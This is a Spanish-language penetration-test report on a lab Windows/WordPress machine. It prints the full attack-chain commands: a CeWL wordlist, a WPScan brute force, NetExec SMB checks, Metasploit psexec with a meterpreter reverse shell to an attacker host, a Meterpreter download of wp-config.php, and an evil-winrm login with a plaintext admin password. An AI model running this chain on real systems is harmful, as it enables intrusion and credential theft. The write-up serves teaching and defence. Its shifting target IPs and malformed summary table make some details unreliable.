**Informe Técnico: - Máquina Virtual Objetivo**

Este informe técnico documenta de forma completa la auditoría de
penetración realizada sobre la máquina virtual objetivo 
------------------------------------------------------------------------

**Fase de Escaneo y Enumeración**

**Con el objetivo de identificar servicios activos y posibles vectores
de ataque se realizó un escaneo de puertos sobre la máquina objetivo
utilizando herramientas de reconocimiento**

<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/38d9d716-6a19-4295-bd38-4c7698937541" />


Se detectaron los siguientes puertos abiertos:

  --------------------------------------------------------------------------
  **Puerto**   **Servicio**   **Descripción**
  ------------ -------------- ----------------------------------------------
  80           HTTP           Servidor web (Apache/PHP)

  135          RPC            Llamadas a procedimientos remotos

  139          NetBIOS        Servicio de compartición en red

  445          SMB            Recursos compartidos de Windows

  5985         WinRM          Administración remota de Windows
  --------------------------------------------------------------------------

**Análisis de los servicios detectados**

**Puerto 80 (HTTP)**\
El puerto 80 se encuentra abierto y accesible, alojando un servidor web
basado en Apache con soporte PHP.\
Durante la enumeración se identificó un sitio web basado en WordPress.

**Posibles vectores de ataque:**

- Enumeración de usuarios

- Ataques de fuerza bruta sobre el panel de login

- Explotación de plugins o servicios vulnerables

**Puertos 135, 139, 445 (RPC/NetBIOS/SMB)**\
Estos puertos corresponden a servicios de red interna de Windows
utilizados para la compartición de archivos y administración remota.

**Posibles vectores de ataque:**

- Enumeración de recursos compartidos

- Acceso a archivos internos

- Autenticación mediante credenciales válidas

- Ejecución remota de comandos (en caso de privilegios suficientes)

**Puerto 5985 (WinRM)**\
El servicio WinRM permite la administración remota del sistema mediante
HTTP.

**Posibles vectores de ataque:**

- Acceso remoto al sistema con credenciales válidas

- Ejecución de comandos de forma remota

- Control del sistema sin necesidad de explotación adicional


**Conclusión de la fase de escaneo**\
El sistema presenta múltiples servicios expuestos que incrementan la
superficie de ataque.

En particular:

- El servicio web (puerto 80) permite la obtención de información y
  posibles credenciales.

- Los servicios SMB (puerto 445) y WinRM (puerto 5985) pueden ser
  utilizados para acceso remoto en caso de compromiso de credenciales.

**Recomendaciones generales para Windows**

- Restringir el acceso al puerto 80 solo a redes internas o una zona
  bastionada; bloquear el acceso desde redes externas a ese servidor
  web.

- Limitar el acceso a los puertos 135, 139 y 445 solo a PCs internos de
  confianza y desactivar el SMBv1 si está activo.

- Revisar y endurecer la administración de credenciales en la web y si
  se usa WinRM configurarlo por HTTPS (puerto 5986) y no dejarlo
  expuesto a redes abiertas.

------------------------------------------------------------------------

**1. Servidor web accesible por el puerto 80**

<img width="527" height="279" alt="image" src="https://github.com/user-attachments/assets/e548de12-8bac-4a75-9b6d-443b7d55c623" />


**Enumeración del servicio web (Puerto 80)**\
La máquina objetivo presenta un servicio web activo en el puerto 80
accesible desde la red.

Al acceder mediante navegador se observa una página web funcional sin
mecanismos visibles de protección frente a enumeración o ataques
automatizados.

**Análisis de la web con WhatWeb**

Se utilizó la herramienta WhatWeb para identificar las tecnologías
empleadas por el servidor.

**Se detectó:**

- Servidor web: Apache 2.4.41

- Sistema operativo: Windows (64 bits)

- Lenguaje: PHP 7.3.12

<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/974e137b-72fa-4659-a889-08a1d1edacbd" />


**ANÁLISIS DE SEGURIDAD**

La exposición de versiones específicas del servidor web y del lenguaje
de programación permite a un atacante:

- Identificar vulnerabilidades conocidas

- Buscar exploits públicos asociados a dichas versiones

La información de versiones expuestas permite que un atacante pueda
buscar exploits específicos para esas versiones de Apache y PHP.

**Recomendaciones**

- Ocultar o limitar la exposición de versiones de software en las
  cabeceras HTTP (por ejemplo ocultar APACHE/X.X y PHP/XX).

- Actualizar Apache y PHP a versiones recientes y parcheadas,
  especialmente si el servidor está expuesto a redes externas.

- Auditar el servidor con escáneres de vulnerabilidades (Nuclei, WPScan,
  etc.) para detectar exploits compatibles con las versiones actuales.

**ESCANEO DE FUZZING**

**Fuzzing y descubrimiento de directorios**

Se realizó un proceso de fuzzing sobre el servidor web utilizando la
herramienta FFUF con el objetivo de identificar rutas ocultas y
servicios accesibles.

**Resultados obtenidos**\
Se identificaron múltiples rutas asociadas a una instalación de
WordPress:

- /wp-admin → Panel de administración

- /wp-login.php → Página de autenticación

- /wp-config.php → Archivo de configuración

- /xmlrpc.php → Interfaz de comunicación remota

- /license.txt y /readme.html → Archivos de documentación



<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b3b0fb4a-4e15-4523-8e75-04a29eee8b2c" />


**Vulnerabilidades identificadas**\
**Exposición de estructura de WordPress - Severidad: MEDIA**\
La accesibilidad de rutas como /wp-admin y /wp-login.php permite la
identificación del sistema y dirigir ataques específicos.

**Exposición de archivos de documentación - Severidad: MEDIA**

- Archivos como readme.html o license.txt pueden revelar:

- Versión de WordPress

- Información del sistema\
  Esto ayuda a buscar vulnerabilidades conocidas.

**Posible exposición de archivo de configuración (wp-config.php) -
Severidad: CRÍTICA**\
El archivo wp-config.php contiene información sensible como:

- Credenciales de base de datos

- Configuración interna

Si este archivo es accesible desde el navegador supone un compromiso
total del sistema.

**XML-RPC habilitado - Severidad: ALTA**\
El archivo /xmlrpc.php permite:

- Ataques de fuerza bruta automatizados

- Enumeración de usuarios

- Posibles ataques de denegación de servicios

**Conclusión**\
El fuzzing permitió identificar la estructura interna del sitio web
confirmando el uso de WordPress y revelando múltiples puntos de ataque
que pueden ser utilizados en fases posteriores de explotación.

------------------------------------------------------------------------

**Análisis de la web de WordPress y comportamiento de redirecciones**

**Análisis del sitio WordPress**\
Al acceder al sitio WordPress en: http://192.168.0.27/wordpress/

se observó un comportamiento anómalo durante la navegación.

**Comportamiento detectado**

- Algunas rutas redirigían o devolvían errores mostrando indicios de que
  el servidor estaba configurado como si se ejecutara en localhost o en
  un entorno de pruebas.

- El panel de login de WordPress (wp-login.php) no permitía acceso
  correctamente incluso disponiendo de credenciales válidas.

<img width="468" height="282" alt="image" src="https://github.com/user-attachments/assets/31abc063-7028-4fb0-a0f4-0bf601c8342b" />


<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/66accd15-06a5-402b-96e0-71f86ca23886" />


**Análisis automatizado del servicio web**\
Ante la situación detectada se decidió centrar el análisis en la única
página del sitio que respondía de forma estable y mostraba cabeceras
HTTP claras.\
Sobre este recurso se ejecutó un análisis automatizado que permitió
identificar varias debilidades de seguridad relevantes.

**Vulnerabilidad: Exposición del panel de login de WordPress**\
Se identificó una página de autenticación de WordPress que permanecía
accesible de manera directa a pesar de los posibles intentos de
ocultación o restricción.\
**Ruta accesible: /wp-login.php**\
Esto facilita ataques de enumeración y fuerza bruta contra el sistema de
autenticación.

<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/7ec9b4c8-da31-4504-8202-58cf8e00e276" />


**Referencia asociada**\
CVE-2024-2473 (referencia a exposición del endpoint de login en
configuraciones inseguras o mal protegidas).

**Enumeración y análisis de WordPress**

**Durante la fase de análisis del servicio web se identificó que el
sistema WordPress permite la enumeración de usuarios a través de la API
REST.**\
**Enumeración de usuarios**\
Mediante el endpoint: /wp-json/wp/v2/users

Se pudieron identificar usuarios válidos del sistema:

- Administrador

- Roldan

<img width="491" height="282" alt="image" src="https://github.com/user-attachments/assets/e4ee0a35-bc42-4860-b892-4b45c50e2fcf" />


**Análisis automatizado con Nuclei**\
Posteriormente se utilizó la herramienta Nuclei sobre la URL del
sitio: http://192.168.0.27/wordpress/\
El análisis detectó múltiples indicadores de seguridad relevantes:

**Vulnerabilidades detectadas:**

- Exposición del panel de login de WordPress --- MEDIA

- Enumeración de usuarios habilitada --- MEDIA/ALTA

- Formulario de login accesible (posible fuerza bruta) --- ALTA

- WordPress versión 5.4.19 obsoleta --- MEDIA

- PHP 7.3.x obsoleto --- MEDIA

- Exposición de archivos informativos (readme/directory listing) ---
  BAJA/INFORMATIVA

<img width="558" height="300" alt="image" src="https://github.com/user-attachments/assets/f6156d94-c7e9-447d-bcef-b2232fcdaf88" />

**Impacto de las vulnerabilidades**

- Estas debilidades permiten:

- Identificar usuarios válidos del sistema

- Realizar ataques de fuerza bruta sobre el panel de login

- Aprovechar versiones obsoletas con vulnerabilidades conocidas

- Incrementar la superficie de ataque del servicio web

**Recomendaciones generales**

- Actualizar WordPress y PHP a versiones actuales y parcheadas.

- Deshabilitar o restringir la API REST de WordPress y wp-json.

- Ocultar readme.html, license.txt y limitar el listado de directorios.

- Controlar y validar las redirecciones para evitar que se utilicen para
  ataques maliciosos.

- Reforzar el login con bloqueo de intentos, captchas y autenticación de
  dos factores.

------------------------------------------------------------------------

**CREACIÓN DE DICCIONARIO CON CEWL**

Se utilizó la herramienta CEWL con el objetivo de generar un diccionario
personalizado a partir del contenido del sitio WordPress para su uso
posterior en ataques de fuerza bruta sobre el panel de autenticación.

**Comando ejecutado:**\
cewl -e http://192.168.0.27/wordpress/ -m 4 -w prototipo_xd

**Resultado: Se generó el diccionario prototipo_xd compuesto por
palabras extraídas del contenido de la página web.**\
Entre los términos obtenidos destacan:

- Roldan

- Quesos

- Manchego

- Quesosroldan

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/4f616aef-bd23-44fe-9117-bcee5134b763" />




**Análisis**\
El diccionario generado contiene términos contextualizados al sitio
objetivo lo que incrementa la eficacia de ataques de fuerza bruta frente
a diccionarios genéricos. Este enfoque permite adaptar el ataque al
entorno real del sistema objetivo.

**Clasificación de la vulnerabilidad**

- Tipo: Exposición de información útil para ataques de diccionario

- Severidad: MEDIA

- Impacto: Facilita ataques de fuerza bruta dirigidos contra el panel de
  autenticación

**RECOMENDACIONES**

- Limitar el acceso al panel de administración de WordPress mediante IP
  o red interna.

- Ocultar o cambiar la URL de wp-login.php para dificultar ataques
  automatizados.

- Reforzar la seguridad del login con bloqueos de intentos fallidos y
  autenticación de dos factores.

------------------------------------------------------------------------

**Explotación de WORDPRESS**

**Ataque de fuerza bruta contra WordPress**\
Se utilizó la herramienta WPScan para realizar un ataque de fuerza bruta
sobre el panel de autenticación del sitio WordPress utilizando un
diccionario personalizado generado previamente.

**Comando ejecutado:**\
wpscan \--url http://192.168.0.27/wordpress/ \--usernames
administrador,roldan \--passwords prototipo_xd



**Objetivo**\
Obtener credenciales válidas de acceso al panel de administración
mediante el ataque de diccionario.

**Resultado**\
El ataque fue exitoso, obtenidas las siguientes credenciales:\
**Usuario: roldan**\
**Contraseña: QuesoManchego**

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/0274338c-177b-43fe-843a-2734eecce46d" />


<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/bb74396c-d59c-42f2-9c0e-48f068d2aa2f" />


- Al intentar entrar por el login se produce una redirección a localhost
  por lo que no se puede acceder al panel de administración desde la
  máquina atacante.

- **Tipo de vulnerabilidad: Acceso de administrador válido pero
  bloqueado por la configuración incorrecta de URL (alta).**

**Recomendaciones:**

- Revisar las URLs de WordPress (WordPress Address y Site URL) para que
  no apunten al localhost.

- Mover o eliminar la web de prueba en localhost si no está en
  producción.

- Limitar el acceso al panel de administración a IPs internas en
  entornos de producción.

------------------------------------------------------------------------

**PIVOTAR AL SMB**

**Acceso al servicio SMB**\
Con las credenciales previamente obtenidas mediante el ataque de fuerza
bruta en WordPress se procedió a realizar pruebas de acceso al SMB
expuesto en la máquina Windows.

**Validación y acceso**\
Se utilizó la herramienta NetExec para verificar la validez de las
credenciales contra el servicio SMB:

**netexec smb 192.168.5.140 -u roldan -p \"QuesoManchego\"**

<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/be603287-e246-4494-ab17-209100414df2" />


**Enumeración de usuarios y recursos**\
Una vez validado el acceso, se realizaron tareas de enumeración:\
**Usuarios del sistema:**

- Administrador

- Guest

- Roldan

**Recursos compartidos detectados:**

- ADMIN\$

- C\$

- IPC\$

**Clasificación de la vulnerabilidad**

- Tipo: Acceso no autorizado mediante credenciales válidas

- Severidad: ALTA

- Impacto: Acceso a recursos internos del sistema Windows y enumeración
  de información sensible

**RECOMENDACIONES**

- Limitar el acceso al SMB solo a redes internas y con control de
  credenciales.

- No usar cuentas locales débiles (roldan, administrador) con
  contraseñas relacionadas con el contenido del sitio.

- Separar claramente la web de prueba localhost de la red de producción
  para evitar que credenciales de prueba se usen en el entorno real.

------------------------------------------------------------------------

**Ejecución Remota mediante SMB (Metasploit)**

Tras la obtención de credenciales válidas en el sistema se identificó la
posibilidad de acceso al servicio SMB del sistema Windows.\
Debido a la enumeración previa del sistema se observó que el usuario
disponía de permisos suficientes para interactuar con recursos
administrativos lo que motivó el uso de un módulo de ejecución remota.

**Módulo utilizado**\
exploit/windows/smb/ms17_010_psexec\
Este módulo permite la ejecución remota de comandos a través del
servicio SMB utilizando credenciales válidas.

**Configuración del exploit**\
Se configuraron los siguientes parámetros:

- Usuario: roldan

- Contraseña: QuesoManchego

- Host objetivo: 192.168.0.26

- Puerto: 445

- Payload: meterpreter/reverse_tcp

- LHOST: 192.168.0.19

- LPORT: 4444

<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/f041c86d-1e8b-4d7e-9ec4-9d93408a8a18" />


**Justificación de la explotación**\
Tras validar el acceso SMB con credenciales válidas y observar la
existencia de recursos administrativos se concluyó que el usuario
disponía de privilegios suficientes para la ejecución remota de código.

Por este motivo se utilizó el módulo PsExec el cual permite crear un
servicio en el sistema objetivo y ejecutar un payload malicioso.

La ejecución del exploit permitió establecer una conexión remota con el
sistema víctima mediante una sesión Meterpreter, confirmando la
ejecución remota de código en el equipo Windows.

**Clasificación de la vulnerabilidad**

- Tipo: Ejecución remota de código mediante SMB

- Severidad: CRÍTICA

- Impacto: Compromiso total del sistema (acceso remoto al equipo
  Windows)

------------------------------------------------------------------------

**Acceso a Archivos Internos y Extracción de Credenciales**

Una vez obtenida la ejecución remota en el sistema mediante sesión
Meterpreter se procedió a la búsqueda de archivos sensibles dentro del
sistema.\
Dado que previamente se había identificado el uso de WordPress, se
decidió localizar el archivo de configuración (wp-config.php) ya que
este suele contener credenciales de acceso a la base de datos.

**Búsqueda del archivo de configuración**\
Se realizó una búsqueda en el sistema para localizar el archivo:\
**dir /s /b C:\\wp-config.php**

Como resultado se identificó la siguiente ruta:\
**C:\\wamp64\\www\\wordpress\\wp-config.php**

**Descarga del archivo**\
Una vez localizado se procedió a la descarga del archivo al equipo
atacante mediante Meterpreter:\
**download C:\\\\wamp64\\\\www\\\\wordpress\\\\wp-config.php**\
El archivo fue transferido correctamente al sistema del auditor.

<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/802be09f-5c89-4479-b1a8-dae1d3c09088" />


<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/89f774aa-3504-4f9b-bd8b-6beeb757c197" />


El acceso previo al panel web no permitió visualizar este archivo debido
a restricciones del servidor y configuraciones relacionadas con
localhost.\
Sin embargo, al obtener acceso directo al sistema fue posible acceder al
archivo de configuración que contiene información sensible como:

- Credenciales de la base de datos

- Configuración interna del sitio WordPress

**El archivo de configuración de WordPress contiene credenciales en
texto plano claro para la conexión con la base de datos.**

- La obtención de estas credenciales implica:

- Acceso directo a la base de datos del sistema

- Posibilidad de lectura, modificación o eliminación de información

- Acceso a datos sensibles (usuarios, contraseñas, contenidos del sitio)

**\"La cadena de ataque demuestra cómo una vulnerabilidad inicial en el
servicio web puede derivar en el compromiso total del sistema y la
exposición de credenciales críticas.\"**

------------------------------------------------------------------------

**Acceso Remoto mediante WinRM**

Tras la obtención de credenciales desde el archivo wp-config.php, se
procedió a su reutilización sobre otros servicios del sistema.\
Se identificó que el servicio WinRM (puerto 5985) estaba activo, por lo
que se intentó el acceso remoto utilizando dichas credenciales.

**evil-winrm -i 192.168.0.26 -u Administrator -p T00MuchW0rk70D0**

<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/00d9a480-36f2-4f46-a430-ec3afd1182a2" />


**Clasificación de la vulnerabilidad**\
**Tipo: Reutilización de credenciales/acceso remoto no autorizado**\
**Severidad: CRÍTICA**\
**Impacto: Control total del sistema (acceso como administrador)**

La reutilización de credenciales ha permitido el acceso directo al
sistema mediante WinRM con privilegios de administrador, confirmando el
compromiso total de la máquina.

------------------------------------------------------------------------

**Resumen de Vulnerabilidades**

+--------------------------+--------------------------------------------+-------------------------+
| **Severidad**            | **Cantidad**                               | **Porcentaje**          |
+------------+-------------+-------------+---------------+--------------+-------------------------+
| **Nº**     | **Vulnerabilidad**        | **Severidad** | **Descripción**                        |
+============+=============+=============+===============+==============+=========================+
| Crítica                  | 3                                          | 30%                     |
+--------------------------+--------------------------------------------+-------------------------+
| Alta                     | 2                                          | 20%                     |
+--------------------------+--------------------------------------------+-------------------------+
| Media                    | 3                                          | 30%                     |
+--------------------------+--------------------------------------------+-------------------------+
| Baja                     | 1                                          | 10%                     |
+--------------------------+--------------------------------------------+-------------------------+
| Informativa              | 1                                          | 10%                     |
+------------+-------------+-------------+---------------+--------------+-------------------------+
| 1          | Acceso SMB con            | 🔴 Crítica    | Permite acceso a recursos internos y   |
|            | credenciales válidas      |               | ejecución remota                       |
+------------+---------------------------+---------------+----------------------------------------+
| 2          | Ejecución remota mediante | 🔴 Crítica    | Permite obtener shell en el sistema    |
|            | SMB (PsExec)              |               |                                        |
+------------+---------------------------+---------------+----------------------------------------+
| 3          | Exposición de             | 🔴 Crítica    | Credenciales en texto plano de la base |
|            | credenciales en           |               | de datos                               |
|            | wp-config.php             |               |                                        |
+------------+---------------------------+---------------+----------------------------------------+
| 4          | Fuerza bruta exitosa en   | 🟠 Alta       | Obtención de credenciales válidas      |
|            | WordPress                 |               |                                        |
+------------+---------------------------+---------------+----------------------------------------+
| 5          | WinRM accesible con       | 🟠 Alta       | Acceso remoto como administrador       |
|            | credenciales reutilizadas |               |                                        |
+------------+---------------------------+---------------+----------------------------------------+
| 6          | Enumeración de usuarios   | 🟡 Media      | Permite identificar usuarios válidos   |
|            | (API REST/WPScan)         |               |                                        |
+------------+---------------------------+---------------+----------------------------------------+
| 7          | Versiones obsoletas       | 🟡 Media      | Vulnerables a exploits conocidos       |
|            | (WordPress/PHP)           |               |                                        |
+------------+---------------------------+---------------+----------------------------------------+
| 8          | Generación de diccionario | 🟡 Media      | Facilita ataques dirigidos             |
|            | (CeWL)                    |               |                                        |
+------------+---------------------------+---------------+----------------------------------------+
| 9          | Exposición de archivos    | 🔵 Baja       | Filtrado de información del sistema    |
|            | informativos              |               |                                        |
+------------+---------------------------+---------------+----------------------------------------+
| 10         | Información de            | ⚪            | Identificación de versiones y          |
|            | tecnologías (WhatWeb)     | Informativa   | servicios                              |
+------------+---------------------------+---------------+----------------------------------------+

**\[ESPACIO PARA CAPTURA: Tabla resumen vulnerabilidades\]**

------------------------------------------------------------------------

**Conclusión**

**La auditoría ha demostrado que, a partir de un acceso inicial al
servicio web, es posible comprometer completamente la infraestructura.**

**La combinación de credenciales débiles, reutilización de contraseñas y
exposición de servicios internos ha permitido escalar el ataque hasta
obtener privilegios máximos en ambos sistemas.**

**Esto implica un riesgo crítico para la organización, ya que un
atacante podría tomar control total de los equipos, acceder a
información sensible y comprometer la integridad del entorno.**
